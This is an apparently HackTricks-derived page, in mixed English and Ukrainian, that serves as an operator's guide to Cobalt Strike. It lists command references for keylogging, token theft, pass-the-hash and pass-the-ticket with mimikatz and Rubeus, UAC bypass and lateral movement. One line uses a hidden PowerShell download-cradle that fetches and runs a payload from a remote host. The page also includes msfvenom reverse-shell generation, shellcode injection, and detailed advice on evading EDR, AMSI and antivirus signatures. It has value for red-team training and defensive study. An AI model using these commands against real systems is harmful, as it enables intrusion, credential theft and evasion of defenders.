# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` потім ви можете вибрати, де прослуховувати, який тип beacon використовувати (http, dns, smb...) та інші параметри.

### Peer2Peer Listeners

The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.

`Cobalt Strike -> Listeners -> Add/Edit` потім потрібно вибрати TCP або SMB beacons

* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** for HTA files
* **`MS Office Macro`** for an office document with a macro
* **`Windows Executable`** for a .exe, .dll orr service .exe
* **`Windows Executable (S)`** for a **stageless** .exe, .dll or service .exe (better stageless than staged, less IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` This will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python

#### Host Payloads

If you already has the file you want to host in a web sever just go to `Attacks -> Web Drive-by -> Host File` and select the file to host and web server config.

### Beacon Options

<details>
<summary>Beacon options and commands</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Кастомні імпланти / Linux Beacons

- Кастомному агенту достатньо вміти говорити з Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile), щоб зареєструватися/check-in і отримувати завдання. Реалізуйте ті ж URI/headers/metadata crypto, визначені в профілі, щоб повторно використовувати UI Cobalt Strike для таскінгу та виводу.
- Aggressor Script (наприклад, `CustomBeacon.cna`) може обгорнути генерацію payload для non-Windows beacon, щоб оператори могли вибрати listener і створювати ELF payload безпосередньо з GUI.
- Приклади Linux task handlers, які варто виставити на Team Server: `sleep`, `cd`, `pwd`, `shell` (виконання довільних команд), `ls`, `upload`, `download`, та `exit`. Вони відповідають task IDs, які очікує Team Server, і мають бути реалізовані на серверній стороні для повернення виводу у правильному форматі.
- Підтримка BOF на Linux може бути додана завантаженням Beacon Object Files in-process за допомогою [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (підтримує Outflank-style BOFs теж), що дозволяє модульний post-exploitation виконуватися в контексті/привілеях імпланта без створення нових процесів.
- Вбудуйте SOCKS handler у кастомний beacon, щоб зберегти паралельність pivoting з Windows Beacons: коли оператор запускає `socks <port>`, імплант має відкрити локальний проксі для маршрутизації інструментів оператора через скомпрометований Linux хост у внутрішні мережі.

## Opsec

### Execute-Assembly

The **`execute-assembly`** використовує **sacrificial process**, застосовуючи remote process injection для виконання вказаної програми. Це дуже шумно, оскільки для інжекції в процес використовуються певні Win APIs, які перевіряє кожен EDR. Однак існують деякі кастомні інструменти, які можна використати, щоб завантажити щось у той самий процес:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike ви також можете використовувати BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

The agressor script `https://github.com/outflanknl/HelpColor` створить команду `helpx` в Cobalt Strike, яка додаватиме кольори в команди, вказуючи чи вони BOFs (зелений), чи вони Fork&Run (жовтий) і подібне, або чи це ProcessExecution, injection або подібне (червоний). Це допомагає знати, які команди більш stealthy.

### Act as the user

Ви можете перевіряти події такі як `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Перевірте всі interactive logons, щоб знати звичний графік роботи.
- System EID 12,13 - Перевірте частоту shutdown/startup/sleep.
- Security EID 4624/4625 - Перевірте вхідні валідні/невалідні NTLM спроби.
- Security EID 4648 - Ця подія створюється, коли для логону використовуються plaintext credentials. Якщо створив її процес, бінарник потенційно має креденшіали у clear text у config файлі або всередині коду.

Коли ви використовуєте `jump` з cobalt strike, краще використовувати метод `wmi_msbuild`, щоб зробити новий процес більш легітимним.

### Use computer accounts

Звично захисники відслідковують дивну поведінку користувачів та можуть **виключати service accounts і computer accounts, наприклад `*$`, з моніторингу**. Ви можете використовувати ці акаунти для lateral movement або privilege escalation.

### Use stageless payloads

Stageless payloads менш шумні ніж staged ones, тому що їм не потрібно завантажувати second stage з C2 server. Це означає, що вони не генерують мережевий трафік після початкового підключення, що робить їх менш ймовірними для виявлення network-based defenses.

### Tokens & Token Store

Будьте обережні, коли крадете або генеруєте tokens, бо EDR може перебрати всі токени всіх потоків і знайти **token, що належить іншому користувачу** або навіть SYSTEM у процесі.

Це дозволяє зберігати токени **per beacon**, щоб не потрібно було красти той самий токен знову і знову. Це корисно для lateral movement або коли потрібно кілька разів використати вкрадений токен:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

При lateral movement зазвичай краще **вкрасти token, ніж генерувати новий** або виконувати pass the hash атаку.

### Guardrails

Cobalt Strike має функцію під назвою **Guardrails**, яка допомагає забороняти використання певних команд або дій, які можуть бути виявлені захисниками. Guardrails можна налаштувати, щоб блокувати конкретні команди, такі як `make_token`, `jump`, `remote-exec` та інші, які часто використовуються для lateral movement або privilege escalation.

Крім того, репо [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) також містить деякі перевірки та ідеї, які варто розглянути перед виконанням payload.

### Tickets encryption

В AD будьте уважні зі шифруванням ticketів. За замовчуванням деякі інструменти будуть використовувати RC4 encryption для Kerberos tickets, що менш безпечно ніж AES, і сучасні оновлені середовища за замовчуванням використовують AES. Це може бути виявлено захисниками, які моніторять використання слабких алгоритмів шифрування.

### Avoid Defaults

Коли ви використовуєте Cobalt Strike, за замовчуванням SMB pipes матимуть ім'я `msagent_####` та `status_####`. Змініть ці імена. Можна перевірити імена існуючих pipe з Cobalt Strike командою: `ls \\.\pipe\`

Крім того, для SSH сесій створюється pipe `\\.\pipe\postex_ssh_####`. Змініть його за допомогою `set ssh_pipename "<new_name>";`.

Також в postex exploitation attack pipe `\\.\pipe\postex_####` можна змінити з `set pipename "<new_name>"`.

В профілях Cobalt Strike ви також можете модифікувати такі речі:

- Уникнення використання `rwx`
- Як працює process injection (які APIs будуть використані) у блоці `process-inject {...}`
- Як працює "fork and run" у блоці `post-ex {…}`
- Час сну (sleep time)
- Макс. розмір бінарників, що завантажуються в пам'ять
- Пам'ятний слід і вміст DLL через блок `stage {...}`
- Мережевий трафік

### Bypass memory scanning

Деякі EDR сканують пам'ять на наявність відомих сигнатур malware. Cobalt Strike дозволяє модифікувати функцію `sleep_mask` як BOF, яка зможе шифрувати backdoor в пам'яті.

### Noisy proc injections

Коли інжектите код у процес, це зазвичай дуже шумно, тому що **звичайні процеси рідко виконують такі дії і способи це робити дуже обмежені**. Тому це може бути виявлено поведінково-орієнтованими системами детекції. Більше того, це також може бути виявлено EDR, які сканують мережу на наявність **потоків, що містять код, якого немає на диску** (хоча процеси на кшталт браузерів з JIT роблять це часто). Приклад: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

При створенні нового процесу важливо **підтримувати звичні parent-child** відносини між процесами, щоб уникнути детекції. Якщо svchost.exe виконує iexplorer.exe, це виглядатиме підозріло, оскільки svchost.exe зазвичай не є батьком iexplorer.exe у нормальному Windows середовищі.

Коли новий beacon спавниться в Cobalt Strike, за замовчуванням створюється процес із використанням **`rundll32.exe`** для запуску нового listener. Це не дуже stealthy і може бути легко виявлене EDR. Більше того, `rundll32.exe` запускається без аргументів, що робить його ще більш підозрілим.

За допомогою наступної команди Cobalt Strike ви можете вказати інший процес для створення нового beacon, роблячи його менш виявлюваним:
```bash
spawnto x86 svchost.exe
```
You can aso change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### Проксування трафіку атакувальника

Іноді атакувальникам потрібно вміти запускати інструменти локально, навіть на Linux-машинах, і спрямовувати трафік жертв до цього інструмента (наприклад, NTLM relay).

Більш того, іноді для виконання атаки pass-the.hash або pass-the-ticket більш приховано для атакувальника **додати цей хеш або квиток у свій власний процес LSASS** локально, а потім pivot-нути з нього, замість того щоб модифікувати процес LSASS на машині жертви.

Однак треба бути **обережним із згенерованим трафіком**, оскільки ви можете відправляти незвичний трафік (Kerberos?) із вашого backdoor-процесу. Для цього можна pivot-нутися в браузерний процес (хоча ви ризикуєте бути виявленими при інжекції в процес, тож продумайте стелс-метод для цього).


### Уникнення AV

#### AV/AMSI/ETW Bypass

Перегляньте сторінку:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Зазвичай у `/opt/cobaltstrike/artifact-kit` можна знайти код та попередньо скомпільовані шаблони (в `/src-common`) payloads, які cobalt strike використовуватиме для генерації бінарних beacons.

Використовуючи [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) згенерованим backdoor (або просто зкомпільованим шаблоном) ви можете знайти, що саме викликає тригер у defender. Зазвичай це рядок. Отже, ви можете просто змінити код, що генерує backdoor, щоб цей рядок не з'являвся у фінальному бінарнику.

Після змін у коді просто запустіть `./build.sh` з того ж каталогу та скопіюйте папку `dist-pipe/` у Windows-клієнт за шляхом `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Не забудьте завантажити агресивний скрипт `dist-pipe\artifact.cna`, щоб вказати Cobalt Strike використовувати ресурси з диска, які ми хочемо, а не ті, що були завантажені.

#### Resource Kit

Папка ResourceKit містить шаблони для скриптових payloads Cobalt Strike, зокрема PowerShell, VBA та HTA.

Використовуючи [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) з цими шаблонами, ви можете з'ясувати, що не подобається захиснику (у цьому випадку AMSI), і змінити це:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Змінюючи виявлені рядки, можна згенерувати шаблон, який не буде виявлено.

Не забудьте завантажити агресивний скрипт `ResourceKit\resources.cna`, щоб вказати Cobalt Strike використовувати ресурси з диска, які нам потрібні, а не ті, що вже завантажені.

#### Function hooks | Syscall

Function hooking — дуже поширений метод ERDs для виявлення шкідливої активності. Cobalt Strike дозволяє обійти ці hooks, використовуючи **syscalls** замість стандартних викликів Windows API через конфіг **`None`**, або використовувати версію функції `Nt*` з налаштуванням **`Direct`**, або просто пропустити функцію `Nt*` з опцією **`Indirect`** у malleable profile. Залежно від системи, одна опція може бути більш стелсною, ніж інша.

Це можна встановити у профілі або використавши команду **`syscall-method``**.

Однак це також може бути шумним.

Одна з опцій, яку надає Cobalt Strike для обходу function hooks — видалити ці hooks за допомогою: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Також можна перевірити, які функції підхоплені (hooked), за допомогою [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) або [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Різні команди Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Джерела

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Аналіз Unit42 щодо шифрування метаданих Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [Щоденник SANS ISC про трафік Cobalt Strike](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
